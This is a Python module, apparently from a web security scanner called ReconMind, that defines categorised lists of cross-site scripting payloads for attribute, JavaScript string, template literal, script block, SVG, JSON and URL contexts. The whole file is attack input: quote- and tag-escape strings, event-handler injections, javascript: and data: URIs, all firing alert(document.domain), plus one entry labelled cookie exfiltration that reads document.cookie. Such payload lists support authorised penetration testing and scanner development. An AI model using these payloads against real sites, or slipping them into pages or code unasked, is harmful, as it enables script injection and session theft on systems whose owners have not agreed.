"""core/payloads/xss/attributes.py — attribute/JS/SVG/JSON/URL context XSS payloads for wamiqsec/ReconMind."""

from typing import List, Dict, Any
Payload = Dict[str, Any]

ATTR_DOUBLE_QUOTE: List[Payload] = [
    {"payload": '" onmouseover="alert(document.domain)"', "tier": 1,
     "technique": "Double-quote escape + onmouseover", "requires": ['"'], "user_interaction": True},
    {"payload": '" autofocus onfocus="alert(document.domain)"', "tier": 1,
     "technique": "Autofocus onfocus", "requires": ['"'], "user_interaction": False},
    {"payload": '"><svg onload=alert(document.domain)>', "tier": 1,
     "technique": "Tag escape + SVG onload", "requires": ['"', "<"], "user_interaction": False},
    {"payload": '" onerror="alert(document.domain)" src="x', "tier": 2,
     "technique": "onerror trailing attr", "requires": ['"'], "user_interaction": False},
    {"payload": '"><script>alert(document.domain)</script>', "tier": 2,
     "technique": "Full tag escape", "requires": ['"', "<"], "user_interaction": False},
]

ATTR_SINGLE_QUOTE: List[Payload] = [
    {"payload": "' onmouseover='alert(document.domain)'", "tier": 1,
     "technique": "Single-quote escape", "requires": ["'"], "user_interaction": True},
    {"payload": "' autofocus onfocus='alert(document.domain)'", "tier": 1,
     "technique": "Autofocus onfocus single-quote", "requires": ["'"], "user_interaction": False},
    {"payload": "'><svg onload=alert(document.domain)>", "tier": 1,
     "technique": "Single-quote tag escape", "requires": ["'", "<"], "user_interaction": False},
]

ATTR_EVENT_HANDLER: List[Payload] = [
    {"payload": "alert(document.domain)", "tier": 1,
     "technique": "Direct execution — already in handler", "requires": [], "user_interaction": False},
    {"payload": "alert(document.cookie)", "tier": 1,
     "technique": "Cookie exfil in event handler", "requires": [], "user_interaction": False},
]

ATTR_UNQUOTED: List[Payload] = [
    {"payload": " onmouseover=alert(document.domain) x=", "tier": 1,
     "technique": "Unquoted attribute injection", "requires": [" "], "user_interaction": True},
    {"payload": " autofocus onfocus=alert(document.domain) x=", "tier": 1,
     "technique": "Unquoted autofocus onfocus", "requires": [" "], "user_interaction": False},
]

JS_STRING_SINGLE: List[Payload] = [
    {"payload": "';alert(document.domain)//", "tier": 1,
     "technique": "Single-quote string close", "requires": ["'"], "user_interaction": False},
    {"payload": "'-alert(document.domain)-'", "tier": 1,
     "technique": "String subtraction trick", "requires": ["'"], "user_interaction": False},
    {"payload": "'};alert(document.domain);//", "tier": 2,
     "technique": "String + block close", "requires": ["'"], "user_interaction": False},
]

JS_STRING_DOUBLE: List[Payload] = [
    {"payload": '";alert(document.domain)//', "tier": 1,
     "technique": "Double-quote string close", "requires": ['"'], "user_interaction": False},
    {"payload": '"-alert(document.domain)-"', "tier": 1,
     "technique": "String subtraction (double)", "requires": ['"'], "user_interaction": False},
    {"payload": '"};alert(document.domain);//', "tier": 2,
     "technique": "String + block close", "requires": ['"'], "user_interaction": False},
]

JS_STRING_TEMPLATE: List[Payload] = [
    {"payload": "`};alert(document.domain);//", "tier": 1,
     "technique": "Template literal close", "requires": ["`"], "user_interaction": False},
    {"payload": "${alert(document.domain)}", "tier": 1,
     "technique": "Template expression injection", "requires": [], "user_interaction": False},
]

JS_SCRIPT_BLOCK: List[Payload] = [
    {"payload": "</script><script>alert(document.domain)</script>", "tier": 1,
     "technique": "Close + reopen script tag", "requires": ["<"], "user_interaction": False},
    {"payload": ";alert(document.domain)//", "tier": 1,
     "technique": "Bare JS statement injection", "requires": [";"], "user_interaction": False},
]

SVG_PAYLOADS: List[Payload] = [
    {"payload": "<script>alert(document.domain)</script>", "tier": 1,
     "technique": "Script tag inside SVG", "requires": ["<"], "user_interaction": False},
    {"payload": "<animate onbegin=alert(document.domain) attributeName=x>", "tier": 1,
     "technique": "SVG animate onbegin", "requires": ["<"], "user_interaction": False},
]

JSON_PAYLOADS: List[Payload] = [
    {"payload": '","xss":"<svg onload=alert(document.domain)>', "tier": 1,
     "technique": "JSON key injection with SVG", "requires": ['"'], "user_interaction": False},
    {"payload": r'\u003cscript\u003ealert(document.domain)\u003c/script\u003e', "tier": 1,
     "technique": "Unicode escape bypass", "requires": [], "user_interaction": False},
]

URL_ATTR_PAYLOADS: List[Payload] = [
    {"payload": "javascript:alert(document.domain)", "tier": 1,
     "technique": "javascript: URI scheme", "requires": [], "user_interaction": True},
    {"payload": "data:text/html,<script>alert(document.domain)</script>", "tier": 2,
     "technique": "data: URI with HTML", "requires": [], "user_interaction": True},
]
